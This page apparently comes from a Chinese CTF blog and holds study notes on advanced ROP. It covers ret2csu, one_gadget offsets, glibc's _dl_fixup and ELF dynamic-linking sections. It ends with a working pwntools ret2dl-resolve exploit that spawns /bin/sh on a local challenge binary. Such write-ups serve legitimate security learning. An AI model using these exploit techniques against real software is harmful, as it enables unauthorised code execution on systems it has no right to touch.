@@ -1,0 +1,915 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Advance-rop | 枫云阁</title>
+  <meta name="keywords" content="">
+  <meta name="description" content="Advance-rop | 枫云阁">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:type" content="article">
+<meta property="og:title" content="hello-world2">
+<meta property="og:url" content="https://primelyw.github.io/2020/04/02/hello-world2/index.html">
+<meta property="og:site_name" content="枫云阁">
+<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:image" content="https://primelyw.github.io/.io//home.png">
+<meta property="article:published_time" content="2020-04-01T17:16:08.000Z">
+<meta property="article:modified_time" content="2020-04-01T17:18:31.830Z">
+<meta property="article:author" content="枫云李">
+<meta property="article:tag" content="Pwning">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://primelyw.github.io/.io//home.png">
+
+
+<link rel="icon" href="/img/avatar2.jpg">
+
+<link href="/css/style.css?v=1.0.1" rel="stylesheet">
+
+<link href="/css/hl_theme/github.css?v=1.0.1" rel="stylesheet">
+
+<link href="//cdn.bootcss.com/animate.css/3.5.2/animate.min.css" rel="stylesheet">
+<link href="//cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css" rel="stylesheet">
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="/js/jquery.autocomplete.min.js?v=1.0.1" ></script>
+
+<script src="//cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+<script>
+    hljs.initHighlightingOnLoad();
+</script>
+
+<script src="//cdn.bootcss.com/nprogress/0.2.0/nprogress.min.js"></script>
+
+
+
+<script src="//cdn.bootcss.com/jquery-cookie/1.4.1/jquery.cookie.min.js" ></script>
+
+<script src="/js/iconfont.js?v=1.0.1" ></script>
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+<div style="display: none">
+  <input class="theme_disqus_on" value="false">
+  <input class="theme_preload_comment" value="false">
+  <input class="theme_blog_path" value="">
+</div>
+
+<body>
+<aside class="nav">
+    <div class="nav-left">
+        <a href="/" class="avatar_target">
+    <img class="avatar" src="/img/avatar2.jpg" />
+</a>
+<div class="author">
+    <span>枫云李</span>
+</div>
+
+<div class="icon">
+    
+        
+        <a title="github" href="https://github.com/primelyw" target="_blank">
+            
+                <svg class="iconfont-svg" aria-hidden="true">
+                    <use xlink:href="#icon-github"></use>
+                </svg>
+            
+        </a>
+        
+    
+</div>
+
+
+
+
+<ul>
+    <li><div class="all active">全部文章<small>(17)</small></div></li>
+    
+</ul>
+<div class="left-bottom">
+    <div class="menus">
+    
+    
+    
+    </div>
+    <div><a  class="friends">友链</a></div>
+</div>
+<input type="hidden" id="yelog_site_posts_number" value="17">
+
+<div style="display: none">
+    <span id="busuanzi_value_site_uv"></span>
+    <span id="busuanzi_value_site_pv"></span>
+</div>
+
+    </div>
+    <div class="nav-right">
+        <div class="friends-area">
+    <div class="friends-title">
+        友情链接
+        <i class="back-title-list"></i>
+    </div>
+    <div class="friends-content">
+        <ul>
+            
+            <li><a target="_blank" href="https://blog.plusls.com/">师父</a></li>
+            
+        </ul>
+    </div>
+</div>
+        <div class="title-list">
+    <form onkeydown="if(event.keyCode === 13){return false;}">
+        <input id="local-search-input" class="search" type="text" placeholder="Search..." />
+        <i class="cross"></i>
+        <span>
+            <label for="tagswitch">Tags:</label>
+            <input id="tagswitch" type="checkbox" style="display: none" />
+            <i id="tagsWitchIcon"></i>
+        </span>
+    </form>
+    <div class="tags-list">
+    
+    <li class="article-tag-list-item">
+        <a class="color4">Pwn</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color4">CTF</a>
+    </li>
+    
+    <li class="article-tag-list-item">
+        <a class="color2">Defcon</a>
+    </li>
+    
+    <div class="clearfix"></div>
+</div>
+
+    
+    <nav id="title-list-nav">
+        
+        <a  class=""
+           href="/2019/04/29/star_ctf/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="star_ctf">star_ctf</span>
+            <span class="post-date" title="2019-04-29 00:00:00">2019/04/29</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/04/30/shellcode/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="shellcode">shellcode</span>
+            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/01/finance/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="finance">finance</span>
+            <span class="post-date" title="2019-05-01 00:00:00">2019/05/01</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/10/pwning/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="pwning">pwning</span>
+            <span class="post-date" title="2019-05-10 00:00:00">2019/05/10</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/26/QWB/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="QWB">QWB</span>
+            <span class="post-date" title="2019-05-26 00:00:00">2019/05/26</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/05/26/assembly/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="assembly">assembly</span>
+            <span class="post-date" title="2019-05-26 00:00:00">2019/05/26</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/07/git_handbook/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="git handbook">git handbook</span>
+            <span class="post-date" title="2019-07-07 00:00:00">2019/07/07</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/11/server_misc/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="server_misc">server_misc</span>
+            <span class="post-date" title="2019-07-11 00:00:00">2019/07/11</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/18/tmux/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="tmux">tmux</span>
+            <span class="post-date" title="2019-07-18 00:00:00">2019/07/18</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/10/20/heap_details/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="heap_details">heap_details</span>
+            <span class="post-date" title="2019-10-20 00:00:00">2019/10/20</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/02/10/nullcon/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="nullcon">nullcon</span>
+            <span class="post-date" title="2020-02-10 00:00:00">2020/02/10</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/04/01/hello-world/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Hello World">Hello World</span>
+            <span class="post-date" title="2020-04-01 23:49:33">2020/04/01</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/04/02/Defcon2019Q/"
+           data-tag="Pwn,CTF,Defcon"
+           data-author="" >
+            <span class="post-title" title="Defcon2019Q">Defcon2019Q</span>
+            <span class="post-date" title="2020-04-02 00:00:00">2020/04/02</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/11/07/Advance-rop/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="Advance-rop">Advance-rop</span>
+            <span class="post-date" title="2019-11-07 09:50:48">2019/11/07</span>
+        </a>
+        
+        <a  class=""
+           href="/2020/04/02/hello-world2/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="hello-world2">hello-world2</span>
+            <span class="post-date" title="2020-04-02 01:16:08">2020/04/02</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/07/22/Pwner/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="pwner">pwner</span>
+            <span class="post-date" title="2019-07-22 00:00:00">2019/07/22</span>
+        </a>
+        
+        <a  class=""
+           href="/2019/04/30/elf_protector/"
+           data-tag=""
+           data-author="" >
+            <span class="post-title" title="elf_protector">elf_protector</span>
+            <span class="post-date" title="2019-04-30 00:00:00">2019/04/30</span>
+        </a>
+        
+    </nav>
+</div>
+    </div>
+    <div class="hide-list">
+        <div class="semicircle">
+            <div class="brackets first"><</div>
+            <div class="brackets">&gt;</div>
+        </div>
+    </div>
+</aside>
+<div class="post">
+    <div class="pjax">
+        <article id="post-Advance-rop" class="article article-type-post" itemscope itemprop="blogPost">
+    
+        <h1 class="article-title">Advance-rop</h1>
+    
+    <div class="article-meta">
+        
+        
+        
+        
+    </div>
+    <div class="article-meta">
+        
+        创建时间:<time class="date" title='更新时间: 2020-03-28 19:14:17'>2019-11-07 09:50</time>
+        
+    </div>
+    <div class="article-meta">
+        
+        
+        <span id="busuanzi_container_page_pv">
+            阅读:<span id="busuanzi_value_page_pv">
+                <span class="count-comment">
+                    <span class="spinner">
+                      <div class="cube1"></div>
+                      <div class="cube2"></div>
+                    </span>
+                </span>
+            </span>
+        </span>
+        
+        
+    </div>
+    
+    <div class="toc-ref">
+    
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#rop"><span class="toc-text">rop</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#return2csu"><span class="toc-text">return2csu</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#分析"><span class="toc-text">分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#attack-payload"><span class="toc-text">attack__payload</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ret2dl-run-time-resloved"><span class="toc-text">ret2dl_run_time_resloved</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#源码"><span class="toc-text">源码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#important-section"><span class="toc-text">important section</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#plt-plt-got"><span class="toc-text">.plt | .plt.got</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#rel-plt"><span class="toc-text">.rel.plt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#got-got-plt"><span class="toc-text">.got | .got.plt</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#dynsym-dynstr"><span class="toc-text">.dynsym | .dynstr</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#漏洞利用，实现无leak的getshell"><span class="toc-text">漏洞利用，实现无leak的getshell</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#分析程序-–-bof-out"><span class="toc-text">分析程序 – bof.out</span></a></li></ol></li></ol></li></ol>
+    
+<style>
+    .left-col .switch-btn,
+    .left-col .switch-area {
+        display: none;
+    }
+    .toc-level-3 i,
+    .toc-level-3 ol {
+        display: none !important;
+    }
+</style>
+</div>
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="rop"><a href="#rop" class="headerlink" title="rop"></a>rop</h1><p>一篇古老的笔记，存档。</p>
+<h2 id="return2csu"><a href="#return2csu" class="headerlink" title="return2csu"></a>return2csu</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><pre><code>.text:00000000004005A0 ; void _libc_csu_init(void)
+.text:00000000004005A0                 public __libc_csu_init
+.text:00000000004005A0 __libc_csu_init proc near               ; DATA XREF: _start+16↑o
+.text:00000000004005A0
+.text:00000000004005A0 var_30          = qword ptr -30h
+.text:00000000004005A0 var_28          = qword ptr -28h
+.text:00000000004005A0 var_20          = qword ptr -20h
+.text:00000000004005A0 var_18          = qword ptr -18h
+.text:00000000004005A0 var_10          = qword ptr -10h
+.text:00000000004005A0 var_8           = qword ptr -8
+.text:00000000004005A0
+.text:00000000004005A0 ; __unwind {
+.text:00000000004005A0                 mov     [rsp+var_28], rbp
+.text:00000000004005A5                 mov     [rsp+var_20], r12
+.text:00000000004005AA                 lea     rbp, cs:600E24h
+.text:00000000004005B1                 lea     r12, cs:600E24h
+.text:00000000004005B8                 mov     [rsp+var_18], r13
+.text:00000000004005BD                 mov     [rsp+var_10], r14
+.text:00000000004005C2                 mov     [rsp+var_8], r15
+.text:00000000004005C7                 mov     [rsp+var_30], rbx
+.text:00000000004005CC                 sub     rsp, 38h
+.text:00000000004005D0                 sub     rbp, r12
+.text:00000000004005D3                 mov     r13d, edi
+.text:00000000004005D6                 mov     r14, rsi
+.text:00000000004005D9                 sar     rbp, 3
+.text:00000000004005DD                 mov     r15, rdx
+.text:00000000004005E0                 call    _init_proc
+.text:00000000004005E5                 test    rbp, rbp
+.text:00000000004005E8                 jz      short loc_400606
+.text:00000000004005EA                 xor     ebx, ebx
+.text:00000000004005EC                 nop     dword ptr [rax+00h]
+.text:00000000004005F0
+.text:00000000004005F0 loc_4005F0:                             ; CODE XREF: __libc_csu_init+64↓j
+.text:00000000004005F0                 mov     rdx, r15
+.text:00000000004005F3                 mov     rsi, r14
+.text:00000000004005F6                 mov     edi, r13d
+.text:00000000004005F9                 call    qword ptr [r12+rbx*8]
+.text:00000000004005FD                 add     rbx, 1
+.text:0000000000400601                 cmp     rbx, rbp
+.text:0000000000400604                 jnz     short loc_4005F0
+.text:0000000000400606
+.text:0000000000400606 loc_400606:                             ; CODE XREF: __libc_csu_init+48↑j
+.text:0000000000400606                 mov     rbx, [rsp+38h+var_30]
+.text:000000000040060B                 mov     rbp, [rsp+38h+var_28]
+.text:0000000000400610                 mov     r12, [rsp+38h+var_20]
+.text:0000000000400615                 mov     r13, [rsp+38h+var_18]
+.text:000000000040061A                 mov     r14, [rsp+38h+var_10]
+.text:000000000040061F                 mov     r15, [rsp+38h+var_8]
+.text:0000000000400624                 add     rsp, 38h
+.text:0000000000400628                 retn
+.text:0000000000400628 ; } // starts at 4005A0
+.text:0000000000400628 __libc_csu_init endp</code></pre><h3 id="attack-payload"><a href="#attack-payload" class="headerlink" title="attack__payload"></a>attack__payload</h3><pre><code class="python">
+#构造 functionA(a,b,c);
+payload=&#39;a&#39;*offset+flat([csu_ret2,0x0,0,1,call_tar,edi,rsi,rdx,csu_ret1])+flat([0,0,0,0,0,0,0,main_addr])</code></pre>
+<pre><code>onegadget libc.so.6-2.27 
+0x4f2c5 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
+constraints:
+  rsp &amp; 0xf == 0
+  rcx == NULL
+
+0x4f322 execve(&quot;/bin/sh&quot;, rsp+0x40, environ)
+constraints:
+  [rsp+0x40] == NULL
+
+0x10a38c execve(&quot;/bin/sh&quot;, rsp+0x70, environ)
+constraints:
+  [rsp+0x70] == NULL</code></pre><h2 id="ret2dl-run-time-resloved"><a href="#ret2dl-run-time-resloved" class="headerlink" title="ret2dl_run_time_resloved"></a>ret2dl_run_time_resloved</h2><h3 id="源码"><a href="#源码" class="headerlink" title="源码"></a>源码</h3><pre><code>cat ./elf/dl-runtime.c
+
+/* This function is called through a special trampoline from the PLT the
+   first time each PLT entry is called.  We must perform the relocation
+   specified in the PLT of the given shared object, and return the resolved
+   function address to the trampoline, which will restart the original call
+   to that address.  Future calls will bounce directly from the PLT to the
+   function.  */
+
+
+_dl_fixup (struct link_map *l, ElfW(Word) reloc_arg)
+{
+  const ElfW(Sym) *const symtab
+    = (const void *) D_PTR (l, l_info[DT_SYMTAB]);
+  const char *strtab = (const void *) D_PTR (l, l_info[DT_STRTAB]);
+
+  const PLTREL *const reloc
+    = (const void *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);
+  const ElfW(Sym) *sym = &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];
+  const ElfW(Sym) *refsym = sym;
+  void *const rel_addr = (void *)(l-&gt;l_addr + reloc-&gt;r_offset);
+  lookup_t result;
+  DL_FIXUP_VALUE_TYPE value;
+
+  /* Sanity check that we&#39;re really looking at a PLT relocation.  */
+  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);
+
+   /* Look up the target symbol.  If the normal lookup rules are not
+      used don&#39;t look in the global scope.  */
+  if (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), 0) == 0)
+    {
+      const struct r_found_version *version = NULL;
+
+      if (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != NULL)
+    {
+      const ElfW(Half) *vernum =
+        (const void *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);
+      ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; 0x7fff;
+      version = &amp;l-&gt;l_versions[ndx];
+      if (version-&gt;hash == 0)
+        version = NULL;
+    }
+
+      /* We need to keep the scope around so do some locking.  This is
+     not necessary for objects which cannot be unloaded or when
+     we are not using any threads (yet).  */
+      int flags = DL_LOOKUP_ADD_DEPENDENCY;
+      if (!RTLD_SINGLE_THREAD_P)
+    {
+      THREAD_GSCOPE_SET_FLAG ();
+      flags |= DL_LOOKUP_GSCOPE_LOCK;
+    }
+
+#ifdef RTLD_ENABLE_FOREIGN_CALL
+      RTLD_ENABLE_FOREIGN_CALL;
+#endif
+
+      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,
+                    version, ELF_RTYPE_CLASS_PLT, flags, NULL);
+
+      /* We are done with the global scope.  */
+      if (!RTLD_SINGLE_THREAD_P)
+    THREAD_GSCOPE_RESET_FLAG ();
+
+#ifdef RTLD_FINALIZE_FOREIGN_CALL
+      RTLD_FINALIZE_FOREIGN_CALL;
+#endif
+
+      /* Currently result contains the base load address (or link map)
+     of the object that defines sym.  Now add in the symbol
+     offset.  */
+      value = DL_FIXUP_MAKE_VALUE (result,
+                   sym ? (LOOKUP_VALUE_ADDRESS (result)
+                      + sym-&gt;st_value) : 0);
+    }
+  else
+    {
+      /* We already found the symbol.  The module (and therefore its load
+     address) is also known.  */
+      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);
+      result = l;
+    }
+
+  /* And now perhaps the relocation addend.  */
+  value = elf_machine_plt_value (l, reloc, value);
+
+  if (sym != NULL
+      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, 0))
+    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));
+
+  /* Finally, fix up the plt itself.  */
+  if (__glibc_unlikely (GLRO(dl_bind_not)))
+    return value;
+
+  return elf_machine_fixup_plt (l, result, refsym, sym, reloc, rel_addr, value); 
+}</code></pre><h3 id="important-section"><a href="#important-section" class="headerlink" title="important section"></a>important section</h3><pre><code>prime@pubuntu ➜ 🍭 ret2dl-resolve readelf -S bof</code></pre><p><img src="/.io//image-20191111164235325.png" alt="image-20191111164235325"></p>
+<pre><code>#dynamic-linked important section
+
+.rel.plt
+.plt 
+.plt.got 
+
+.got 
+.got.plt 
+
+.dynsym
+.dynstr</code></pre><p>What does it look like? Let’s read ELF.</p>
+<pre><code>prime@pubuntu ➜ 🍭 ret2dl-resolve file bof
+bof: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-, for GNU/Linux 2.6.32, BuildID[sha1]=fbf836d803f75a6c9b6e0993bea8a800e097a53f, not stripped</code></pre><h4 id="plt-plt-got"><a href="#plt-plt-got" class="headerlink" title=".plt | .plt.got"></a><code>.plt</code> | <code>.plt.got</code></h4><p><img src="/.io//image-20191111215815685.png" alt="image-20191111215815685"></p>
+<p><img src="/.io//image-20191111215824423.png" alt="image-20191111215824423"></p>
+<p><code>.plt</code> 过程链接表，动态链接的函数都通过这个调用入口，每个函数都有一个 <code>rel_offset</code> ，其中 <code>write</code> 的重定向偏移为<code>0x20</code></p>
+<h4 id="rel-plt"><a href="#rel-plt" class="headerlink" title=".rel.plt"></a><code>.rel.plt</code></h4><p><img src="/.io//image-20191111162736318.png" alt="image-20191111162736318"></p>
+<pre><code>typedef struct {
+Elf32_Addr r_offset;    // 对于可执行文件，此值为虚拟地址，4字节
+Elf32_Word r_info;      // 符号表索引 ，4字节
+} Elf32_Rel;</code></pre><p><code>write.ELF32_Rel = {0x804A01C, 0x607}</code> </p>
+<h4 id="got-got-plt"><a href="#got-got-plt" class="headerlink" title=".got | .got.plt"></a><code>.got</code> | <code>.got.plt</code></h4><p><code>.got</code> 保存了<code>动态链接</code> 的变量地址，<code>.got.plt</code> 存动态链接函数地址。</p>
+<p><img src="/.io//image-20191111163010436.png" alt="image-20191111163010436"></p>
+<p><img src="/.io//image-20191111163613505.png" alt="image-20191111163613505"></p>
+<h4 id="dynsym-dynstr"><a href="#dynsym-dynstr" class="headerlink" title=".dynsym | .dynstr"></a><code>.dynsym</code> | <code>.dynstr</code></h4><p><code>.dynsym</code> 保存了动态链接符号表，<code>.dynstr</code> 保存了动态链接字符串。</p>
+<p><img src="/.io//image-20191111164151157.png" alt="image-20191111164151157"></p>
+<p><img src="/.io//image-20191111164200594.png" alt="image-20191111164200594"></p>
+<pre><code>typedef struct
+{
+Elf32_Word st_name;     // Symbol name(string tbl index) ,4bytes
+Elf32_Addr st_value;    // Symbol value ,4bytes
+Elf32_Word st_size;     // Symbol size 4bytes
+unsigned char st_info;  // Symbol type and binding ,1bytes
+unsigned char st_other; // Symbol visibility under glibc&gt;=2.2 ,1bytes
+Elf32_Section st_shndx; // Section index ,2bytes
+} Elf32_Sym</code></pre><p><img src="/.io//image-20191111214121700.png" alt="image-20191111214121700"></p>
+<p><code>write.ELF32_Sym={0x4c,0,0,0x12,0,0}</code> , <code>st_name=0x4c</code> </p>
+<pre><code>prime@pubuntu ➜ 🍭 ret2dl-resolve readelf -x .dynsym  bof
+
+Hex dump of section &#39;.dynsym&#39;:
+  0x080481d8 00000000 00000000 00000000 00000000 ................
+  0x080481e8 33000000 00000000 00000000 12000000 3...............
+  0x080481f8 27000000 00000000 00000000 12000000 &#39;...............
+  0x08048208 52000000 00000000 00000000 20000000 R........... ...
+  0x08048218 20000000 00000000 00000000 12000000  ...............
+  0x08048228 3a000000 00000000 00000000 12000000 :...............
+  0x08048238 4c000000 00000000 00000000 12000000 L...............
+  0x08048248 2c000000 44a00408 04000000 11001a00 ,...D...........
+  0x08048258 0b000000 3c860408 04000000 11001000 ....&lt;...........
+  0x08048268 1a000000 40a00408 04000000 11001a00 ....@...........</code></pre><p><img src="/.io//image-20191111214217904.png" alt="image-20191111214217904"></p>
+<p><img src="/.io//image-20191111214340061.png" alt="image-20191111214340061"></p>
+<h3 id="漏洞利用，实现无leak的getshell"><a href="#漏洞利用，实现无leak的getshell" class="headerlink" title="漏洞利用，实现无leak的getshell"></a>漏洞利用，实现无leak的getshell</h3><ul>
+<li><input checked disabled type="checkbox"> 存在栈溢出漏洞。</li>
+<li><input checked disabled type="checkbox"> 栈迁移到<code>bss</code> ,为后期布局内存做准备。</li>
+<li><input checked disabled type="checkbox"> 利用 <code>_dl_runtime_resolve</code> 机制布局内存<ol>
+<li>在内存中布置 <code>fake_rel_table</code> 、<code>fake_sym_table</code> 、<code>fake_str_table</code> 。</li>
+<li>修改 <code>rel_offset</code> 使得<code>Rel</code>定位到 <code>fake_rel_table</code> 。</li>
+<li>修改 <code>r_info</code> 使得<code>符号</code>定位到 <code>fake_sym_table</code> </li>
+<li>修改 <code>st_name</code> 使得 <code>函数字符串</code> 定位到 <code>fake_str_table</code></li>
+</ol>
+</li>
+<li><input checked disabled type="checkbox"> <code>Pwned!</code></li>
+</ul>
+<h3 id="分析程序-–-bof-out"><a href="#分析程序-–-bof-out" class="headerlink" title="分析程序 – bof.out"></a>分析程序 – bof.out</h3><p>我们以调用<code>write</code>为例，因为可以观察到字符串，调试方便，最后把字符串换成 <code>system</code> 即可。</p>
+<p>… 后期更新</p>
+<p>最后exp</p>
+<pre><code class="python">from pwn import * 
+p=process(&#39;./bof&#39;) 
+elf=ELF(&quot;./bof&quot;)
+context.arch=&#39;i386&#39;
+context.terminal=[&#39;tmux&#39;,&#39;splitw&#39;,&#39;-h&#39;]
+
+read_plt=elf.plt[&#39;read&#39;]
+main_func=elf.sym[&#39;main&#39;]
+write_plt=elf.plt[&#39;write&#39;]
+write_got=elf.got[&#39;write&#39;]
+ppp_ret=0x08048619
+bss_start=elf.bss()
+offset=108
+stack_base=bss_start+0x800
+ebp=stack_base 
+leave_ret=0x08048458
+pop_ebp_ret=0x0804861b
+plt0=0x08048380
+rel_plt=0x08048330
+
+fake_sym=stack_base+0x80
+rel_index=stack_base+0x60-rel_plt
+dyn_sym=0x80481D8
+dyn_str=0x08048278
+sym_index=(stack_base+0x88-dyn_sym)/0x10
+r_info=(sym_index&lt;&lt;8)+7
+log.success(&#39;r_info:%x&#39;%r_info)
+
+fake_reloc=flat([write_got,r_info]) # at stack_base+0x60
+st_name_offset=stack_base+0xa0-dyn_str
+fake_sym=flat([st_name_offset,0,0,12]) # at stack_base+0x80
+
+log.success(&#39;stack_base:%x&#39;%stack_base)
+log.success(&#39;dyn_sym:%x&#39;%dyn_sym)
+
+# migrate stack 
+p.recvuntil(&#39;Welcome to XDCTF2015~!\n&#39;)
+payload=&#39;a&#39;*offset+flat([
+    ebp,read_plt,ppp_ret,0,stack_base,0x200,pop_ebp_ret,stack_base,leave_ret]
+    )
+p.sendline(payload)
+sleep(0.1)
+#gdb.attach(p,&#39;b *main\n&#39;)
+cmd=&#39;/bin/sh;\x00&#39;
+
+payload2=flat([
+    &#39;a&#39;*4,
+    plt0,
+    rel_index,
+    0xdeadbeef, #any_ret
+    stack_base+0x40, # cmd string is here
+])
+
+payload2+=&#39;b&#39;*(0x40-len(payload2))
+payload2 += cmd
+payload2 += &#39;b&#39;*(0x60-len(payload2))
+payload2+=fake_reloc
+payload2+=&#39;b&#39;*(0x88-len(payload2)) 
+payload2+=fake_sym #stack_base+0x80
+payload2+=&#39;b&#39;*(0xa0-len(payload2))
+payload2+=&#39;system\x00&#39;
+
+
+p.sendline(payload2)
+p.interactive()</code></pre>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论。 </span>
+    </div>
+</article>
+
+
+
+<div class="article_copyright">
+    <p><span class="copy-title">文章标题:</span>Advance-rop</p>
+    
+    <p><span class="copy-title">本文作者:</span><a  title="枫云李">枫云李</a></p>
+    <p><span class="copy-title">发布时间:</span>2019-11-07, 09:50:48</p>
+    <p><span class="copy-title">最后更新:</span>2020-03-28, 19:14:17</p>
+    <span class="copy-title">原始链接:</span><a class="post-url" href="/2019/11/07/Advance-rop/" title="Advance-rop">https://primelyw.github.io/2019/11/07/Advance-rop/</a>
+    <p>
+        <span class="copy-title">版权声明:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" href="http://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank" title="CC BY-NC-SA 4.0 International" target = "_blank">"署名-非商用-相同方式共享 4.0"</a> 转载请保留原文链接及作者。
+    </p>
+</div>
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">©2020 枫云李</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full"><span class="min "></span></button>
+<button class="post-toc-menu"><span class="post-toc-menu-icons"></span></button>
+<div class="post-toc"><span class="post-toc-title">目录</span>
+    <div class="post-toc-content">
+
+    </div>
+</div>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+<div class="acParent"></div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.0.1" ></script>
+
+<script src="/js/script.js?v=1.0.1" ></script>
+<script>
+    var img_resize = 'default';
+    /*作者、标签的自动补全*/
+    $(function () {
+        $('.search').AutoComplete({
+            'data': ['#Pwn','#CTF','#Defcon',],
+            'itemHeight': 20,
+            'width': 418
+        }).AutoComplete('show');
+    })
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $(".post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+        $('pre code').each(function(){
+            var lines = $(this).text().trim().split('\n').length, widther='';
+            if (lines>99) {
+                widther = 'widther'
+            }
+            var $numbering = $('<ul/>').addClass('pre-numbering ' + widther).attr("unselectable","on");
+            $(this).addClass('has-numbering ' + widther)
+                    .parent()
+                    .append($numbering);
+            for(var i=1;i<=lines;i++){
+                $numbering.append($('<li/>').text(i));
+            }
+        });
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<style>
+    pre{
+        position: relative;
+        margin-bottom: 24px;
+        border-radius: 10px;
+        border: 1px solid #e2dede;
+        background: #FFF;
+        overflow: hidden;
+    }
+    code.has-numbering{
+        margin-left: 30px;
+    }
+    code.has-numbering.widther{
+        margin-left: 35px;
+    }
+    .pre-numbering{
+        margin: 0px;
+        position: absolute;
+        top: 0;
+        left: 0;
+        width: 20px;
+        padding: 0.5em 3px 0.7em 5px;
+        border-right: 1px solid #C3CCD0;
+        text-align: right;
+        color: #AAA;
+        background-color: ;
+    }
+    .pre-numbering.widther {
+        width: 35px;
+    }
+</style>
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 542px;
+    }
+    .nav.fullscreen {
+        margin-left: -542px;
+    }
+    .nav-left {
+        width: 120px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 492px;
+        }
+        .nav.fullscreen {
+            margin-left: -492px;
+        }
